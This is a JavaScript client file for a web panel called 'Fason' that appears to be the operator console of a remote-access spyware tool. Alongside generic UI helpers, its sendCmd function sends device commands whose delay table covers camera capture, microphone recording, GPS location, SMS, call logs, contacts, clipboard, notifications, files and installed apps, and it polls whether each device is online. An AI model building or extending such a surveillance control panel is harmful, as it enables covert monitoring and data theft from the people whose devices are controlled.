// Fason - Client-side logic
(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        RELOAD_DELAY: 1200,
        AUTO_REFRESH_INTERVAL: 60000,
        TOAST_DURATION: 3000,
        API_TIMEOUT: 30000
    };
    
    // Utility functions
    const utils = {
        // Debounce function
        debounce(fn, delay) {
            let timeout;
            return function(...args) {
                clearTimeout(timeout);
                timeout = setTimeout(() => fn.apply(this, args), delay);
            };
        },
        
        // Escape HTML
        escapeHtml(str) {
            if (!str) return '';
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        },
        
        // Format bytes
        formatBytes(bytes, decimals = 2) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(decimals)) + ' ' + sizes[i];
        },
        
        // Format duration
        formatDuration(seconds) {
            if (!seconds || seconds <= 0) return '—';
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            if (h > 0) return `${h}h ${m}m`;
            if (m > 0) return `${m}m ${s}s`;
            return `${s}s`;
        },
        
        // Format relative time
        formatRelative(date) {
            if (!date) return '—';
            const now = new Date();
            const d = new Date(date);
            const diff = now - d;
            
            if (diff < 60000) return 'Just now';
            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
            if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
            return d.toLocaleDateString();
        }
    };
    
    // Make utils globally available
    window.utils = utils;
    
    // Toast notification system
    function toast(msg, type = 'info', duration = CONFIG.TOAST_DURATION) {
        const t = document.getElementById('toast');
        if (!t) {
            console.log(`[Toast ${type}] ${msg}`);
            return;
        }
        
        // Add icon based on type
        const icons = {
            success: '✓',
            error: '✕',
            warning: '⚠',
            info: 'ℹ'
        };
        
        t.innerHTML = `<span>${icons[type] || ''}</span> ${utils.escapeHtml(msg)}`;
        t.className = `toast show ${type}`;
        
        setTimeout(() => {
            t.className = 'toast';
        }, duration);
    }
    
    // Make toast globally available
    window.toast = toast;
    
    // API request helper
    async function api(path, options = {}) {
        const { method = 'GET', body = null, timeout = CONFIG.API_TIMEOUT } = options;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        try {
            const fetchOptions = {
                method,
                headers: { 'Content-Type': 'application/json' },
                signal: controller.signal
            };
            
            if (body) {
                fetchOptions.body = JSON.stringify(body);
            }
            
            const response = await fetch(path, fetchOptions);
            clearTimeout(timeoutId);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            return await response.json();
        } catch (err) {
            clearTimeout(timeoutId);
            throw err;
        }
    }
    
    // Make api globally available
    window.api = api;
    
    // Send command to device
    function sendCmd(cmd, params = {}, options = {}) {
        const id = typeof DEVICE_ID !== 'undefined' ? DEVICE_ID : '';
        if (!id) {
            toast('Device ID not found', 'error');
            return Promise.reject('No device ID');
        }
        
        // Different delays for different commands
        const commandDelays = {
            '0xCA': 3000,    // Camera - needs time to capture
            '0xWI': 3000,    // WiFi scan - needs time to scan
            '0xLO': 2000,    // Location - needs GPS fix
            '0xMI': 1000,    // Mic - just starts recording
            '0xFI': 2000,    // Files - needs time to list
            '0xIN': 2000,    // Apps - needs time to list
            '0xPM': 2000,    // Permissions - needs time to check
            '0xNO': 2000,    // Notifications - needs time to fetch
            '0xCB': 1500,    // Clipboard
            '0xSM': 1500,    // SMS
            '0xCL': 1500,    // Calls
            '0xCO': 1500     // Contacts
        };
        
        const defaultDelay = CONFIG.RELOAD_DELAY;
        const reloadDelay = commandDelays[cmd] || defaultDelay;
        const { autoReload = true } = options;
        
        return api(`/cmd/${id}/${cmd}`, { method: 'POST', body: params })
            .then(data => {
                if (data.error) {
                    toast(data.error, 'error');
                    throw new Error(data.error);
                } else {
                    toast(data.message || 'Command sent', 'success');
                    if (autoReload) {
                        setTimeout(() => location.reload(), reloadDelay);
                    }
                    return data;
                }
            })
            .catch(err => {
                const msg = err.name === 'AbortError' 
                    ? 'Request timed out' 
                    : (err.message || 'Request failed');
                toast(msg, 'error');
                throw err;
            });
    }
    
    // Make sendCmd globally available
    window.sendCmd = sendCmd;
    
    // Send command without auto-reload
    function sendCmdNoReload(cmd, params = {}) {
        return sendCmd(cmd, params, { autoReload: false });
    }
    
    // Make sendCmdNoReload globally available
    window.sendCmdNoReload = sendCmdNoReload;
    
    // Auto-refresh for device pages (only on specific pages)
    function setupAutoRefresh() {
        if (typeof DEVICE_ID === 'undefined') return;
        
        // Only auto-refresh on these pages where data needs to be updated
        const autoRefreshPages = ['info', 'downloads', 'permissions', 'notifications'];
        const path = window.location.pathname;
        const shouldRefresh = autoRefreshPages.some(p => path.includes('/' + p));
        
        if (shouldRefresh) {
            // Use visibility API to only refresh when visible
            let interval = setInterval(() => {
                if (document.visibilityState === 'visible') {
                    location.reload();
                }
            }, CONFIG.AUTO_REFRESH_INTERVAL);
            
            // Clean up on page unload
            window.addEventListener('beforeunload', () => {
                clearInterval(interval);
            });
        }
    }
    
    // Keyboard shortcuts
    function setupKeyboardShortcuts() {
        document.addEventListener('keydown', e => {
            // Escape - go back to dashboard
            if (e.key === 'Escape' && window.location.pathname !== '/') {
                window.location.href = '/';
            }
            
            // R key - refresh (when not in input)
            if (e.key === 'r' && !['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
                e.preventDefault();
                location.reload();
            }
            
            // ? key - show help
            if (e.key === '?' && e.shiftKey) {
                e.preventDefault();
                showHelp();
            }
        });
    }
    
    // Initialize confirmations for dangerous actions
    function setupConfirmations() {
        document.querySelectorAll('[data-confirm]').forEach(el => {
            el.addEventListener('click', (e) => {
                const msg = el.getAttribute('data-confirm');
                if (!confirm(msg)) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                }
            });
        });
    }
    
    // Copy to clipboard utility
    function copyToClipboard(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                toast('Copied to clipboard', 'success');
            }).catch(() => {
                toast('Failed to copy', 'error');
            });
        } else {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                toast('Copied to clipboard', 'success');
            } catch (e) {
                toast('Failed to copy', 'error');
            }
            document.body.removeChild(textarea);
        }
    }
    
    // Make copyToClipboard globally available
    window.copyToClipboard = copyToClipboard;
    
    // Format date utility
    function formatDate(date) {
        if (!date) return '—';
        return new Date(date).toLocaleString();
    }
    
    // Make formatDate globally available
    window.formatDate = formatDate;
    
    // Download file
    function downloadFile(url, filename) {
        const a = document.createElement('a');
        a.href = url;
        a.download = filename || '';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }
    
    // Make downloadFile globally available
    window.downloadFile = downloadFile;
    
    // Show help modal
    function showHelp() {
        const help = `
Keyboard Shortcuts:
• ESC - Return to dashboard
• R - Refresh current page
• ? - Show this help
        `;
        alert(help);
    }
    
    // Device status polling
    function pollDeviceStatus() {
        if (typeof DEVICE_ID === 'undefined') return;
        
        setInterval(async () => {
            try {
                const data = await api(`/api/client/${DEVICE_ID}`);
                updateStatusBar(data);
            } catch (ignored) {}
        }, 30000); // Every 30 seconds
    }
    
    // Update status bar
    function updateStatusBar(client) {
        const statusEl = document.querySelector('.status-indicator');
        if (!statusEl || !client) return;
        
        statusEl.className = `status-indicator ${client.online ? 'online' : 'offline'}`;
        statusEl.querySelector('span:last-child').textContent = 
            client.online ? 'Online' : 'Offline';
    }
    
    // Initialize on DOM ready
    document.addEventListener('DOMContentLoaded', () => {
        setupAutoRefresh();
        setupKeyboardShortcuts();
        setupConfirmations();
        pollDeviceStatus();
        
        console.log('Fason initialized');
    });
})();
